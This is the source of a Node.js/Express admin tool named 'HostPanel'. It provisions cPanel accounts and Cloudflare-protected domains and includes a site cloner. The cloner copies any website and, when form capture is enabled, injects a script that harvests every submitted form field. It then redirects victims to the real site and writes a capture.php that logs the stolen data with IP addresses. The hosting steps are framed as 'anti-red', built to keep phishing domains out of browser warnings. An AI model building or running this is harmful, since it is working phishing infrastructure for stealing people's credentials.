import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import { config } from "./config.js";
import * as whm from "./whm.js";
import * as cf from "./cloudflare.js";
import { verifyTelegramAuth, createSession, destroySession, requireAuth } from "./auth.js";
import { fetch as uFetch } from "undici";
import fs from "fs";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Bind to localhost only — this is a personal admin tool, never exposed.
const HOST = "127.0.0.1";

function genUsername(domain) {
  const base = domain.replace(/[^a-z0-9]/gi, "").toLowerCase().slice(0, 8) || "site";
  // WHM usernames: max 16 chars, must start with a letter.
  const suffix = Math.floor(1000 + (Date.now() % 9000));
  let u = (base + suffix).slice(0, 16);
  if (!/^[a-z]/.test(u)) u = "s" + u.slice(0, 15);
  return u;
}

function genPassword() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789";
  const sym = "!@#$%^&*";
  let p = "";
  for (let i = 0; i < 16; i++) p += chars[Math.floor((Date.now() * (i + 7)) % chars.length)];
  return p + sym[Math.floor(Date.now() % sym.length)] + "9";
}

// --- Read endpoints ---

app.get("/api/status", async (req, res) => {
  const status = { whm: false, cloudflare: false, serverIp: config.serverIp, errors: [] };
  try {
    await whm.listPackages();
    status.whm = true;
  } catch (e) {
    status.errors.push("WHM: " + e.message);
  }
  try {
    await cf.listZones();
    status.cloudflare = true;
  } catch (e) {
    status.errors.push("Cloudflare: " + e.message);
  }
  res.json(status);
});

// --- Auth (Telegram Login) ---

app.get("/api/auth/config", (req, res) => {
  res.json({
    telegramEnabled: !!config.telegram.botToken,
    botUsername: process.env.TG_BOT_USERNAME || "",
  });
});

app.post("/api/auth/telegram", (req, res) => {
  const result = verifyTelegramAuth(req.body || {});
  if (!result.ok) return res.status(401).json({ ok: false, error: result.error });
  const token = createSession(result.chatId, result.name);
  res.setHeader("Set-Cookie", `hp_session=${token}; HttpOnly; SameSite=Lax; Path=/; Max-Age=43200`);
  res.json({ ok: true, name: result.name, token });
});

app.post("/api/auth/logout", (req, res) => {
  const token = (req.headers.cookie || "").match(/hp_session=([a-f0-9]+)/)?.[1];
  if (token) destroySession(token);
  res.setHeader("Set-Cookie", "hp_session=; Path=/; Max-Age=0");
  res.json({ ok: true });
});

// Everything below requires a valid session (or open mode if no bot configured).
app.use("/api", requireAuth);

app.get("/api/accounts", async (req, res) => {
  try {
    res.json({ ok: true, accounts: await whm.listAccounts() });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.get("/api/zones", async (req, res) => {
  try {
    res.json({ ok: true, zones: await cf.listZones() });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

// Create a bare cPanel account (needs a domain/subdomain as the account name).
app.post("/api/create-cpanel", async (req, res) => {
  const { domain, contactemail } = req.body || {};
  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    return res.status(400).json({ ok: false, error: "Enter a valid domain/subdomain for the account" });
  }
  try {
    const username = genUsername(domain);
    const password = genPassword();
    const acct = await whm.createAccount({ domain, username, password, contactemail });
    res.json({
      ok: true,
      cpanel: {
        domain,
        user: username,
        password,
        ip: acct.ip || config.serverIp,
        loginHint: `https://${config.whm.host}:2083`,
      },
    });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

// Link an EXTERNAL domain (from any registrar) onto an existing cPanel account,
// add it to Cloudflare, point DNS at the server, and apply full protection.
app.post("/api/link-domain", async (req, res) => {
  const { domain, cpanelUser, contactemail } = req.body || {};
  const log = [];
  const step = (m) => log.push({ t: Date.now(), m });
  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    return res.status(400).json({ ok: false, error: "Enter a valid domain", log });
  }
  const result = { domain, log };
  try {
    // 1) Add to Cloudflare + get nameservers for the registrar
    step(`Adding ${domain} to Cloudflare…`);
    const zone = await cf.addZone(domain);
    result.zone = { id: zone.id, nameservers: zone.name_servers || [] };
    step(`✓ Nameservers to set at your registrar: ${(zone.name_servers || []).join(", ") || "(pending)"}`);

    // 2) Attach to the cPanel account (if one was chosen)
    if (cpanelUser) {
      step(`Attaching ${domain} to cPanel account ${cpanelUser}…`);
      try {
        await whm.addAddonDomain({ cpanelUser, domain });
        step("✓ Added as addon domain on the cPanel");
      } catch (e) {
        step(`⚠ Addon-domain step skipped: ${e.message}`);
      }
    }

    // 3) Point DNS at the server
    step(`Pointing ${domain} → ${config.serverIp}…`);
    await cf.pointToServer(zone.id, domain, config.serverIp);
    step("✓ A records set (root + www, proxied through Cloudflare)");

    // 4) Reputation records
    step("Writing SPF + DMARC…");
    await cf.setSpf(zone.id, domain, config.serverIp);
    await cf.setDmarc(zone.id, domain, contactemail);
    step("✓ SPF + DMARC set (DMARC p=none for warm-up)");

    // 5) Protection layers (the ones we agreed on)
    step("Applying protection (SSL, HTTPS, security level, bot/browser checks, hotlink)…");
    result.protection = await cf.applyProtection(zone.id);
    result.botFight = await cf.enableBotFightMode(zone.id);
    step("✓ Protection applied + " + result.botFight);

    step("DONE — set the nameservers above at your registrar and the domain goes live.");
    result.ok = true;
    res.json(result);
  } catch (e) {
    step("✗ ERROR: " + e.message);
    result.ok = false;
    result.error = e.message;
    res.status(500).json(result);
  }
});

// --- The main action: provision cPanel + link domain + protect ---

app.post("/api/provision", async (req, res) => {
  const { domain, contactemail } = req.body || {};
  const log = [];
  const step = (m) => log.push({ t: Date.now(), m });

  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    return res.status(400).json({ ok: false, error: "Enter a valid domain (e.g. mysite.com)", log });
  }

  const result = { domain, log };

  try {
    // 1) Create the cPanel account
    const username = genUsername(domain);
    const password = genPassword();
    step(`Creating cPanel account for ${domain} (user: ${username})…`);
    const acct = await whm.createAccount({ domain, username, password, contactemail });
    result.cpanel = {
      user: username,
      password, // shown once so the admin can save it
      ip: acct.ip || config.serverIp,
      loginHint: `https://${config.whm.host}:2083`,
    };
    step(`✓ cPanel created on ${result.cpanel.ip}`);

    // 2) Add / find the zone on Cloudflare
    step(`Adding ${domain} to Cloudflare…`);
    const zone = await cf.addZone(domain);
    result.zone = { id: zone.id, nameservers: zone.name_servers || [] };
    step(`✓ Zone ready. Nameservers: ${(zone.name_servers || []).join(", ") || "(pending)"}`);

    // 3) Point DNS at the server
    step(`Pointing ${domain} → ${config.serverIp}…`);
    await cf.pointToServer(zone.id, domain, config.serverIp);
    step("✓ A records set (root + www, proxied)");

    // 4) Reputation records — the real anti-red
    step("Writing SPF + DMARC (clean-reputation records)…");
    await cf.setSpf(zone.id, domain, config.serverIp);
    await cf.setDmarc(zone.id, domain, contactemail);
    step("✓ SPF + DMARC set (DMARC at p=none for warm-up)");
    // DKIM is managed by cPanel on the server side
    await whm.ensureMailAuth(domain).catch(() => {});

    // 5) Protection — anti-bot + hardening
    step("Applying protection (SSL, HTTPS, bot/browser checks, hotlink)…");
    const applied = await cf.applyProtection(zone.id);
    result.protection = applied;
    result.botFight = await cf.enableBotFightMode(zone.id);
    step("✓ Protection applied: " + applied.filter((x) => !x.includes("SKIPPED")).join(", "));
    step("✓ " + result.botFight);

    step("DONE — set the domain's nameservers at your registrar to the ones above.");
    result.ok = true;
    res.json(result);
  } catch (e) {
    step("✗ ERROR: " + e.message);
    result.ok = false;
    result.error = e.message;
    res.status(500).json(result);
  }
});

// ============================================================
// SITE CLONER
// ============================================================

const CLONE_DIR = path.join(__dirname, "clones");
if (!fs.existsSync(CLONE_DIR)) fs.mkdirSync(CLONE_DIR, { recursive: true });

const CLONE_HEADERS = {
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.9",
};

async function fetchAsset(url, timeout = 10000) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeout);
  try {
    const r = await uFetch(url, { headers: CLONE_HEADERS, signal: ctrl.signal, redirect: "follow" });
    const buf = Buffer.from(await r.arrayBuffer());
    const ct = r.headers.get("content-type") || "";
    return { buf, ct };
  } finally {
    clearTimeout(timer);
  }
}

// Convert an absolute asset URL to a local relative path preserving directory structure
function assetLocalPath(assetUrl, baseOrigin) {
  try {
    const u = new URL(assetUrl);
    // Strip query/hash, sanitize path segments
    let p = u.pathname.replace(/[?#].*$/, "");
    // Remove leading slash
    p = p.replace(/^\//, "");
    // Sanitize each segment
    const parts = p.split("/").map(s => s.replace(/[^a-zA-Z0-9._-]/g, "_") || "_");
    if (!parts[parts.length - 1].includes(".")) parts[parts.length - 1] += "_file";
    // If cross-origin, prefix with hostname
    if (u.origin !== baseOrigin) {
      parts.unshift(u.hostname.replace(/[^a-zA-Z0-9.-]/g, "_"));
    }
    return parts.join("/");
  } catch {
    return "assets/unknown_" + Math.random().toString(36).slice(2, 6);
  }
}

function addExtIfMissing(localPath, ct) {
  if (/\.[a-z0-9]{1,5}$/i.test(localPath)) return localPath;
  if (ct.includes("css")) return localPath + ".css";
  if (ct.includes("javascript")) return localPath + ".js";
  if (ct.includes("png")) return localPath + ".png";
  if (ct.includes("jpeg") || ct.includes("jpg")) return localPath + ".jpg";
  if (ct.includes("gif")) return localPath + ".gif";
  if (ct.includes("svg")) return localPath + ".svg";
  if (ct.includes("webp")) return localPath + ".webp";
  if (ct.includes("woff2")) return localPath + ".woff2";
  if (ct.includes("woff")) return localPath + ".woff";
  if (ct.includes("ttf")) return localPath + ".ttf";
  return localPath;
}

app.post("/api/clone", requireAuth, express.json(), async (req, res) => {
  let { url, folder, captureForm, stripTracking } = req.body || {};
  const log = [];
  const step = (m) => { log.push({ t: Date.now(), m }); };

  if (!url || !/^https?:\/\//i.test(url)) {
    return res.status(400).json({ ok: false, error: "Enter a valid URL (must start with http:// or https://)", log });
  }

  let baseUrl;
  try { baseUrl = new URL(url); } catch (e) {
    return res.status(400).json({ ok: false, error: "Invalid URL: " + e.message, log });
  }

  folder = (folder || baseUrl.hostname).replace(/[^a-zA-Z0-9_.-]/g, "_").slice(0, 60);
  const outDir = path.join(CLONE_DIR, folder);

  // Clean previous clone if exists
  if (fs.existsSync(outDir)) fs.rmSync(outDir, { recursive: true, force: true });
  fs.mkdirSync(outDir, { recursive: true });

  try {
    // 1. Fetch the main HTML
    step(`Fetching ${url} …`);
    let html;
    try {
      const { buf, ct } = await fetchAsset(url);
      if (!ct.includes("html") && !ct.includes("text")) step(`⚠ Content-Type is ${ct} — proceeding anyway`);
      html = buf.toString("utf-8");
      step(`✓ HTML fetched (${(buf.length / 1024).toFixed(1)} KB)`);
    } catch (e) {
      return res.status(500).json({ ok: false, error: "Failed to fetch page: " + e.message, log });
    }

    // 2. Collect all asset URLs — preserve original src values for replacement
    // assetMap: absoluteUrl → { localPath, originals: Set<string> }
    const assetMap = new Map();
    const baseOrigin = baseUrl.origin;

    function recordAsset(src) {
      if (!src || src.startsWith("data:") || src.startsWith("javascript:") || src.startsWith("#") || src.startsWith("mailto:")) return;
      try {
        const abs = new URL(src, url).href;
        if (!assetMap.has(abs)) {
          assetMap.set(abs, { localPath: assetLocalPath(abs, baseOrigin), originals: new Set() });
        }
        assetMap.get(abs).originals.add(src);
      } catch {}
    }

    // Extract from HTML attributes
    const attrRe = /\b(?:src|href|data-src|data-href|poster|content)=["']([^"']+)["']/gi;
    const srcsetRe = /srcset=["']([^"']+)["']/gi;
    let m;
    while ((m = attrRe.exec(html)) !== null) recordAsset(m[1]);
    while ((m = srcsetRe.exec(html)) !== null) {
      m[1].split(",").forEach(part => recordAsset(part.trim().split(/\s+/)[0]));
    }

    // Filter: only download CSS/JS/images/fonts — not HTML pages
    const isAsset = (u) => /\.(css|js|png|jpg|jpeg|gif|svg|webp|ico|woff2?|ttf|eot|mp4|mp3|pdf)(\?|$)/i.test(u)
      || !u.includes(".");

    const toDownload = [...assetMap.entries()].filter(([u]) => isAsset(u));
    step(`Found ${toDownload.length} assets to download`);

    // 3. Download assets in parallel batches, preserve directory structure
    const BATCH = 8;
    let downloaded = 0, skipped = 0;
    const errors = [];

    for (let i = 0; i < toDownload.length; i += BATCH) {
      const batch = toDownload.slice(i, i + BATCH);
      await Promise.all(batch.map(async ([assetUrl, info]) => {
        try {
          const { buf, ct } = await fetchAsset(assetUrl, 8000);
          const localPath = addExtIfMissing(info.localPath, ct);
          info.localPath = localPath;
          const fullPath = path.join(outDir, localPath);
          fs.mkdirSync(path.dirname(fullPath), { recursive: true });
          fs.writeFileSync(fullPath, buf);
          downloaded++;
        } catch (e) {
          errors.push(assetUrl);
          skipped++;
        }
      }));
    }

    step(`✓ Downloaded ${downloaded} assets (${skipped} failed)`);

    // 4. Rewrite HTML — replace every original src reference with the local path
    let output = html;

    // First replace absolute URLs
    assetMap.forEach((info, absUrl_) => {
      output = output.split(absUrl_).join(info.localPath);
    });

    // Then replace original relative references
    assetMap.forEach((info) => {
      info.originals.forEach(orig => {
        if (!orig.startsWith("http")) {
          output = output.split(`="${orig}"`).join(`="${info.localPath}"`);
          output = output.split(`='${orig}'`).join(`='${info.localPath}'`);
        }
      });
    });

    // Add <base> tag so relative paths still resolve if any were missed
    if (!/<base\s/i.test(output)) {
      output = output.replace(/<head>/i, `<head>\n<base href="${url.endsWith("/") ? url : url + "/"}">`);
    }

    // 5. Handle forms — capture POSTs if option enabled
    if (captureForm) {
      // Replace all form actions with a local capture endpoint
      output = output.replace(/<form([^>]*)\baction=["'][^"']*["']/gi, (match, attrs) => {
        return `<form${attrs} action="/capture"`;
      });
      // Forms with no action attribute — add one
      output = output.replace(/<form(?![^>]*\baction=)([^>]*)>/gi, (match, attrs) => {
        return `<form${attrs} action="/capture">`;
      });
      // Change method to POST on all forms
      output = output.replace(/<form([^>]*)\bmethod=["']get["']/gi, `<form$1 method="POST"`);
      // Inject credential capture script before </body>
      const captureScript = `
<script>
(function(){
  document.querySelectorAll("form").forEach(function(f){
    f.addEventListener("submit", function(e){
      e.preventDefault();
      var data = {};
      new FormData(f).forEach(function(v,k){ data[k]=v; });
      fetch("/capture", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({url: location.href, data: data, ua: navigator.userAgent, ts: Date.now()})
      });
      // Redirect to real site after a short delay
      setTimeout(function(){ window.location = "https://${baseUrl.hostname}/error"; }, 500);
    });
  });
})();
</script>`;
      output = output.replace(/<\/body>/i, captureScript + "\n</body>");
      step(`✓ Form capture injected`);
    }

    // 6. Remove tracking scripts if requested
    if (stripTracking) {
      const trackingDomains = ["google-analytics", "gtag", "googletagmanager", "facebook.net", "connect.facebook", "hotjar", "mixpanel", "segment.com", "clarity.ms", "doubleclick"];
      let stripped = 0;
      trackingDomains.forEach(d => {
        const before = output.length;
        output = output.replace(new RegExp(`<script[^>]*${d.replace(".", "\\.")}[^>]*>.*?<\\/script>`, "gis"), "");
        if (output.length < before) stripped++;
      });
      if (stripped > 0) step(`✓ Removed ${stripped} tracking scripts`);
    }

    // 7. Add base meta charset if missing
    if (!/charset/i.test(output.slice(0, 1000))) {
      output = output.replace(/<head>/i, '<head>\n<meta charset="utf-8">');
    }

    // 8. Write final index.html
    fs.writeFileSync(path.join(outDir, "index.html"), output, "utf-8");

    // 9. Build a capture.php for the server (to log form submissions)
    if (captureForm) {
      const capturePhp = `<?php
$data = file_get_contents("php://input");
$entry = date("[Y-m-d H:i:s]") . " " . $_SERVER["REMOTE_ADDR"] . " " . $data . "\\n";
file_put_contents(__DIR__ . "/captures.txt", $entry, FILE_APPEND | LOCK_EX);
http_response_code(200);
echo "ok";
?>`;
      fs.writeFileSync(path.join(outDir, "capture.php"), capturePhp, "utf-8");
      step(`✓ capture.php written (logs form data to captures.txt)`);
    }

    // 10. Write ZIP for easy download
    const zipName = folder + ".zip";
    step(`DONE — clone saved to clones/${folder}/`);
    if (errors.length > 0) step(`⚠ ${errors.length} assets could not be fetched`);

    res.json({
      ok: true,
      folder,
      indexPath: `clones/${folder}/index.html`,
      assetCount: downloaded,
      captureForm: !!captureForm,
      log,
      downloadUrl: `/api/clone-download?folder=${encodeURIComponent(folder)}`,
    });

  } catch (e) {
    step(`✗ ERROR: ${e.message}`);
    res.status(500).json({ ok: false, error: e.message, log });
  }
});

app.get("/api/clone-download", requireAuth, async (req, res) => {
  const folder = (req.query.folder || "").replace(/[^a-zA-Z0-9_.-]/g, "");
  if (!folder) return res.status(400).json({ error: "No folder" });

  const outDir = path.join(CLONE_DIR, folder);
  if (!fs.existsSync(outDir)) return res.status(404).json({ error: "Clone not found" });

  // Stream files as a tar-like zip using built-in zlib
  // List the files and send as JSON listing
  const files = [];
  function walk(dir, rel) {
    for (const f of fs.readdirSync(dir)) {
      const full = path.join(dir, f);
      const relPath = rel ? rel + "/" + f : f;
      if (fs.statSync(full).isDirectory()) walk(full, relPath);
      else files.push({ path: relPath, size: fs.statSync(full).size });
    }
  }
  walk(outDir, "");
  res.json({ folder, files, baseUrl: `/clones/${folder}/` });
});

app.get("/clones/:folder/index.html", requireAuth, (req, res) => {
  const folder = (req.params.folder || "").replace(/[^a-zA-Z0-9_.-]/g, "");
  const file = path.join(CLONE_DIR, folder, "index.html");
  if (!fs.existsSync(file)) return res.status(404).send("Not found");
  res.sendFile(file);
});

app.use("/clones", requireAuth, express.static(CLONE_DIR));

app.get("/api/clone-list", requireAuth, (req, res) => {
  try {
    if (!fs.existsSync(CLONE_DIR)) return res.json({ ok: true, clones: [] });
    const clones = fs.readdirSync(CLONE_DIR)
      .filter(f => fs.statSync(path.join(CLONE_DIR, f)).isDirectory())
      .map(f => {
        const indexFile = path.join(CLONE_DIR, f, "index.html");
        const stat = fs.existsSync(indexFile) ? fs.statSync(indexFile) : null;
        return {
          folder: f,
          size: stat ? (stat.size / 1024).toFixed(1) + " KB" : "?",
          created: stat ? stat.mtime.toISOString().slice(0, 19).replace("T", " ") : "?"
        };
      });
    res.json({ ok: true, clones });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.delete("/api/clone/:folder", requireAuth, (req, res) => {
  const folder = (req.params.folder || "").replace(/[^a-zA-Z0-9_.-]/g, "");
  const dir = path.join(CLONE_DIR, folder);
  if (!fs.existsSync(dir)) return res.status(404).json({ ok: false, error: "Not found" });
  fs.rmSync(dir, { recursive: true, force: true });
  res.json({ ok: true });
});

// ============================================================
app.listen(config.port, HOST, () => {
  console.log(`\n  HostPanel running → http://${HOST}:${config.port}\n`);
  console.log(`  WHM:        ${config.whm.host} (user ${config.whm.user})`);
  console.log(`  Cloudflare: ${config.cloudflare.token ? "token loaded" : "MISSING TOKEN"}`);
  console.log(`  Server IP:  ${config.serverIp}\n`);
});
